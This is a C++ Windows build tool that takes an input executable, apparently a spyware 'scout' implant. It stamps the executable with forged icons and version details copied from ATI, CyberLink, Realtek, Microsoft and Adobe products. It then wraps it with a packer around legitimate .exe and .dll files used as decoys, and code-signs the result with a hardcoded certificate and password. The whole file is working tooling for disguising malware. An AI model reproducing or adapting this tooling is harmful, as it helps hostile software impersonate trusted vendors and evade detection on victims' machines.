#include <Windows.h>
#include <iostream>

#define SECTION_RANDOM_NAME	15

static char *szSectionNames[SECTION_RANDOM_NAME] = 
{
	".textbss",
	".pages",
	".visical",
	".inferno",
	".calc",
	".notepad",
	".word",
	".viper0",
	".venom",
	".text0",
	".uspack0",
	".hermit",
	".locals",
	".stack1",
	".GLOBAL"
};

struct scout_names {
	char *name;
	char *version;
	char *desc;
	char *company;
	char *copyright;
};

struct scout_names info[] = {
	{ "CCC", "3.5.0.5", "Catalyst Control Center: Host application", "ATI Technologies Inc.", "2002-2010" },
	{ "PDVD9Serv", "9.0.3401.1", "PowerDVD RC Service", "CyberLink Corp.", "Copyright (c) CyberLink Corp. 1997-2008"},
	{ "RtDCpl",  "1.0.0.12",  "HD Audio Control Panel",  "Realtek Semiconductor Corp.",  "Copyright 2010 (c) Realtek Semiconductor Corp.. All rights reserved."},
	{ "sllauncher",  "5.1.10411.3",  "Microsoft Silverlight Out-of-Browser Launcher",  "Microsoft Silverlight",  "Copyright (c) Microsoft Corporation.All rights reserved."},
	{ "WLIDSVCM",  "7.250.4225.2",  "Microsoft (r) Windows Live ID Service Monitor",  "Microsoft (r) CoReXT",  "Copyright (c) Microsoft Corporation.All rights reserved."},
	{ "FLASH", "11.3.300.268", "Adobe (r) Flsah (c) Player Installer", "Adobe (r) Flash Player", "Copyright (c) 1996 Adobe System Incorporated." }
};


int filter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	std::cout << "caught AV as expected. " << std::endl;
	return EXCEPTION_EXECUTE_HANDLER;
}

struct param
{
	char szCommandLine[500];
	char szTempPathBuffer[MAX_PATH];
	char szTempFileName[MAX_PATH];
	char szOutputFile[MAX_PATH];
	char szVirtualSize[32];
	char szSectionName[32];
	char szFakeFile[MAX_PATH];

	char **fakeargv;
};

DWORD WINAPI ThreadWorker(LPVOID lpArgument)
{
	struct param *p = (struct param *) lpArgument;
	char szCommandLine[500];
	
	memset(szCommandLine, 0, sizeof(szCommandLine));

	// run RCEDIT
	int r = GetTickCount() % 6;

	sprintf(szCommandLine, "%s /I %s z:\\core-packer.devel\\release\\icons\\%s.ico", "z:\\core-packer.devel\\release\\rcedit.exe", p->szTempFileName, info[r].name);
	std::cout << szCommandLine << std::endl;
	system(szCommandLine);	// patch A


	sprintf(szCommandLine, "%s \"%s\" /va 1.0.0.0 /fn /s desc \"%s\" /s company \"%s\" /s \"(c)\" \"%s\" /s product \"%s\"", 
		"z:\\core-packer.devel\\release\\verpatch.exe", 
		p->szTempFileName, 
		info[r].desc,
		info[r].company,
		info[r].copyright,
		info[r].desc);

	std::cout << szCommandLine << std::endl;
	system(szCommandLine);	// patch A

	memset(szCommandLine, 0, sizeof(szCommandLine));
	sprintf(szCommandLine, "%s %s %s %s", // %s %s %s\0", 
		"z:\\core-packer\\release\\packer32.exe", 
		p->szTempFileName, 
		p->szOutputFile, 
		p->szFakeFile);
		//p->szSectionName, 
		//p->szVirtualSize);


	int i = system(szCommandLine);
	if (i == -1)
	{
		DeleteFileA(p->szOutputFile);
		return -1;
	}

	//char *s = (char *) malloc(strlen(szCommandLine) + 1);

	//strcpy(s, szCommandLine);

	//DWORD dummy = 0;
	//CreateThread(NULL, 0, &ThreadWorker, (LPVOID) s, NULL, &dummy);

	memset(szCommandLine, 0, sizeof(szCommandLine));
	sprintf(szCommandLine, "%s sign /P password /F %s %s", "z:\\signtool.exe", "z:\\andrea.pfx",  p->szOutputFile);
	
	std::cout << szCommandLine << std::endl;
	system(szCommandLine);

	DeleteFileA(p->szTempFileName);
	//main32(6, fakeargv);
	std::cout << ".... done" << std::endl;
	free(p);

	return 0;
}



int main(int argc, char *argv[])
{
	char szOutputFile[MAX_PATH];
	char szInputFile[MAX_PATH];
	char szFakeFile[MAX_PATH];
	char szWindirPath[MAX_PATH];
	char szBaseSize[128];
	char szVirtualSize[128];
	char szSectionName[128];

	//char *fakeargv[] = { NULL, szInputFile, szOutputFile, szFakeFile, szSectionName, szVirtualSize };
	
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle("kernel32"),"IsWow64Process");


	//DWORD dwIgnore = GetEnvironmentVariableA("windir", szWindirPath, MAX_PATH);

	//if (dwIgnore == 0)
	//{	// try default c:\windows
	//	strcpy(szWindirPath, "C:\\windows\\");
	//}
	//else
	//{
	//	int i = strlen(szWindirPath);

	//	if (szWindirPath[i-1] != '\\')
	//		strcat(szWindirPath, "\\");
	//}

	//if(NULL != fnIsWow64Process)
 //   {
	//	BOOL bIsWow64 = FALSE;

	//	fnIsWow64Process(GetCurrentProcess(),&bIsWow64);

	//	if (bIsWow64)
	//		strcat(szWindirPath, "syswow64\\");
	//	else
	//		strcat(szWindirPath, "system32\\");
 //   }
	//else
	//{
	//	strcat(szWindirPath, "system32\\");
	//}
	//
	strcpy(szWindirPath, "C:\\temp\\test\\");

	char szFindPath[MAX_PATH];
	sprintf(szFindPath, "%s*.*", szWindirPath);

	WIN32_FIND_DATA findfiledata;
	HANDLE hLook = FindFirstFileA(szFindPath, &findfiledata);
		
	do
	{	// perform a backup!
		strcpy(szInputFile, argv[1]);
		Sleep(250);

		if (strstr(findfiledata.cFileName, ".exe") == 0 &&
			strstr(findfiledata.cFileName, ".dll") == 0)
			continue;	// skip this extension

		//strcpy(szFakeFile, "c:\\tools\\putty.exe");

		sprintf(szFakeFile, "%s%s", szWindirPath, findfiledata.cFileName);
		std::cout << "Test using " << szFakeFile << std::endl;
		sprintf(szOutputFile, "%s\\%s", argv[2], findfiledata.cFileName);

		//CreateDirectoryA(szOutputFile, NULL);

		for(int i = 0; i < 1; i++)
		{
			for(int vs = 0x3c00; vs < 1024 * 16; vs+=0x8000)
			{
				__try
				{
					struct param *p = (struct param *) malloc(sizeof(struct param));
					
					memset(p, 0, sizeof(struct param));

					ZeroMemory(p->szTempPathBuffer, sizeof(p->szTempPathBuffer));
					ZeroMemory(p->szTempFileName, sizeof(p->szTempFileName));

					DWORD dwRetFile = GetTempPathA(MAX_PATH, p->szTempPathBuffer);
					GetTempFileNameA(p->szTempPathBuffer, "SCOUT", 0, p->szTempFileName);

					CopyFileA(argv[1], p->szTempFileName, FALSE);


					strcpy(p->szSectionName, szSectionNames[i]);
					sprintf(p->szVirtualSize, "%i", vs);
					
					sprintf(p->szFakeFile, "%s%s", szWindirPath, findfiledata.cFileName);
					sprintf(p->szOutputFile, "%s\\%s.exe", argv[2], findfiledata.cFileName);

					DWORD dwThreadId = 0;

					CreateThread(NULL, 0, &ThreadWorker, p, NULL, &dwThreadId);
					
				}
				__except(filter(GetExceptionCode(), GetExceptionInformation())) 
				{
					std::cout << ".... done" << std::endl;
				}
			}
		}
		//DeleteFileA(szFakeFile);
	} while(FindNextFileA(hLook, &findfiledata));

	FindClose(hLook);

	Sleep(10000);
	return 1;
}
